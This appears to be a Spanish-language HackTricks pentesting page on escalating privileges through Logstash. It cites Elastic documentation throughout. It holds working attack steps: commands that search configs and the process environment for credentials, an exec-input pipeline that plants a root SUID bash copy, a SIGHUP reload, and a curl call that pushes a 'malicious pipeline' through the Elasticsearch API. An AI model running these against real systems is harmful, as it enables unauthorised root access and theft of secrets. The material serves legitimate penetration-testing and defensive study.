# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se utiliza para **recopilar, transformar y distribuir registros** mediante un sistema conocido como **pipelines**. Estos pipelines constan de etapas de **entrada**, **filtro** y **salida**.<sup>[[4]](#references)</sup> Un aspecto interesante surge cuando Logstash se ejecuta en una máquina comprometida.

### Configuración de pipelines

En las instalaciones de paquetes Debian y RPM, los pipelines se configuran mediante **/etc/logstash/pipelines.yml**, que indica las ubicaciones de las configuraciones de los pipelines; en otras distribuciones, `pipelines.yml` se encuentra en el directorio `path.settings` de Logstash.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Este archivo revela dónde se encuentran los archivos **.conf** que contienen las configuraciones de pipeline. Al usar un **Elasticsearch output**, inspecciona sus ajustes `user`/`password`, `cloud_auth` o `api_key`; los privilegios efectivos de la cuenta dependen de Elasticsearch. Un glob `path.config` carga todos los archivos coincidentes para ese pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Si Logstash se inicia con `-f <directory>` en lugar de `pipelines.yml`, `-f` tiene prioridad y **todos los archivos de ese directorio se concatenan en orden lexicográfico y se analizan como una sola configuración**.<sup>[[6]](#references)[[7]](#references)</sup> Esto tiene 2 implicaciones ofensivas:

- Un archivo colocado, como `000-input.conf` o `zzz-output.conf`, puede cambiar cómo se ensambla el pipeline final
- Un archivo malformado puede hacer que la configuración combinada no supere la validación; durante la recarga, Logstash conserva el pipeline anterior, así que valida los payloads antes de confiar en la recarga automática.<sup>[[1]](#references)</sup>

### Enumeración rápida en un host comprometido

En una máquina donde esté instalado Logstash, inspecciona rápidamente:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Comprueba también si se puede acceder a la API de monitorización local. De forma predeterminada, se vincula a **127.0.0.1:9600**, lo que suele ser suficiente tras conseguir acceso al host.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Estos endpoints exponen los IDs y la configuración de los pipelines, métricas de runtime y contadores de éxito o fallo al recargar la configuración, lo que ayuda a confirmar si se aceptó un cambio.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Si una credencial recuperada está dirigida a **Elasticsearch**, consulta [esta otra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Entrada de archivo que alimenta una salida de comando dinámica

Un usuario puede tener acceso de solo lectura a la configuración de un pipeline mientras que su [entrada de archivo](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) supervisa una ruta en la que puede escribir. Sigue el pipeline cargado desde esa entrada, pasando por cualquier [captura de campo Grok](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok), hasta una [salida exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). La salida exec pasa su `command` a través de un shell y sustituye los valores de `%{field}` sin sanitizar los metacaracteres del shell. Una ruta de entrada con permisos de escritura solo supone una vía potencial para escalar privilegios si el servicio en ejecución tiene una identidad con más privilegios, el archivo del usuario puede llegar realmente a la entrada supervisada, los filtros y las condiciones de salida dirigen su contenido al campo del comando, y ese plugin de salida está instalado y activo. Comprueba por separado los permisos de búsqueda y escritura del directorio, el estado de seguimiento de la entrada de archivo y la cuenta de servicio efectiva; no escribas un evento de prueba ni invoques la salida durante la enumeración pasiva.

### Escalada de privilegios mediante pipelines con permisos de escritura

Para intentar escalar privilegios, identifica primero el usuario con el que se está ejecutando realmente el servicio Logstash; no des por hecho que es root o el usuario **logstash**. Asegúrate de cumplir **uno** de estos criterios:

- Tener **acceso de escritura** a un archivo de pipeline **.conf**, **o**
- Que el archivo **/etc/logstash/pipelines.yml** use un comodín y puedas escribir en la carpeta de destino.<sup>[[6]](#references)[[7]](#references)</sup>

Además, debe cumplirse **una** de estas condiciones:

- Tener la capacidad de reiniciar el servicio Logstash, **o**
- Que el archivo **/etc/logstash/logstash.yml** tenga establecido **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Si la configuración incluye un comodín, crear un archivo que coincida con él permite ejecutar comandos.<sup>[[7]](#references)[[9]](#references)</sup> Por ejemplo:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Aquí, **interval** determina la frecuencia de ejecución en segundos. En el ejemplo, el comando **whoami** se ejecuta cada 120 segundos y dirige su salida a **/tmp/output.log**.<sup>[[9]](#references)</sup>

Con **config.reload.automatic: true** en **/etc/logstash/logstash.yml**, Logstash detectará y aplicará automáticamente las configuraciones de pipeline nuevas o modificadas sin necesidad de reiniciarse.<sup>[[1]](#references)[[15]](#references)</sup> Si no hay ningún comodín, aún se pueden modificar las configuraciones existentes, pero se recomienda actuar con cautela para evitar interrupciones.

### Payloads de pipeline más fiables

El plugin de entrada `exec` sigue funcionando en las versiones actuales y requiere un `interval` o un `schedule`. Ejecuta el comando mediante un **fork** de la JVM de Logstash, por lo que, si hay poca memoria, el payload puede fallar con `ENOMEM` en lugar de ejecutarse silenciosamente.<sup>[[9]](#references)</sup>

Si el servicio tiene privilegios suficientes para crear un archivo SUID propiedad de root, un payload práctico de escalada de privilegios puede dejar un artefacto persistente:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Si no tienes permisos para reiniciarlo, pero puedes enviar señales al proceso, Logstash también admite una recarga activada por **SIGHUP** en sistemas tipo Unix:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Ten en cuenta que no todos los plugins admiten bien la recarga. Por ejemplo, el input **stdin** impide la recarga automática, así que no des por sentado que `config.reload.automatic` siempre aplicará tus cambios.<sup>[[1]](#references)</sup>

### Robo de secretos de Logstash

Antes de centrarte únicamente en la ejecución de código, recopila los datos a los que Logstash ya tiene acceso:

- Las credenciales pueden aparecer en outputs `elasticsearch {}`, URLs o ajustes de `http_poller`, inputs JDBC o ajustes relacionados con la nube; vale la pena buscar campos de credenciales en estos plugins.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Los ajustes seguros pueden estar en **`/etc/logstash/logstash.keystore`** o en otro directorio `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- La contraseña del keystore puede proporcionarse mediante **`LOGSTASH_KEYSTORE_PASS`**, y las instalaciones RPM/DEB obtienen las variables de entorno del servicio de **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- La expansión de variables de entorno con `${VAR}` se resuelve al iniciar Logstash, así que conviene inspeccionar el entorno del servicio.<sup>[[14]](#references)</sup>

Comprobaciones útiles:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

También vale la pena comprobarlo porque **CVE-2023-46672** mostró que, en determinadas circunstancias, Logstash registraba información confidencial en sus logs, incluidos secretos almacenados en su keystore y referenciados desde la configuración; revisa los logs antiguos de Logstash y las entradas de `journald` si esas circunstancias podrían aplicarse.<sup>[[3]](#references)</sup>

### Abuso de la administración centralizada de pipelines

En algunos entornos, el host **no** depende en absoluto de archivos `.conf` locales. Si se configura **`xpack.management.enabled: true`**, Logstash puede obtener pipelines administrados de forma centralizada desde Elasticsearch/Kibana y, tras habilitar este modo, las configuraciones locales de pipelines dejan de ser la fuente de verdad.<sup>[[2]](#references)</sup>

Esto implica una vía de ataque diferente:

1. Recupera las credenciales de Elastic de la configuración local de Logstash, el keystore o los logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Comprueba si la cuenta tiene el privilegio de clúster **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Crea o reemplaza un pipeline administrado de forma centralizada para que el host de Logstash ejecute tu payload en su siguiente intervalo de sondeo.<sup>[[2]](#references)[[16]](#references)</sup>

La API de Elasticsearch utilizada para esta función es:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Esto resulta especialmente útil cuando los archivos locales son de solo lectura, pero Logstash ya está registrado para obtener pipelines de forma remota.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Recargar el archivo de configuración](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configurar la administración centralizada de pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Actualización de seguridad de Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Crear un pipeline de Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Diseño de directorios de Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Varios pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Ejecutar Logstash desde la línea de comandos](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Supervisar Logstash con APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Plugin de entrada Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Almacén de secretos para configuraciones seguras](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Plugin de salida Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Plugin de entrada Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Plugin de entrada Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Uso de variables de entorno](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [API de Elasticsearch: Crear o actualizar un pipeline de Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [API de Logstash: Obtener la configuración de los pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [API de Logstash: Obtener estadísticas de los pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
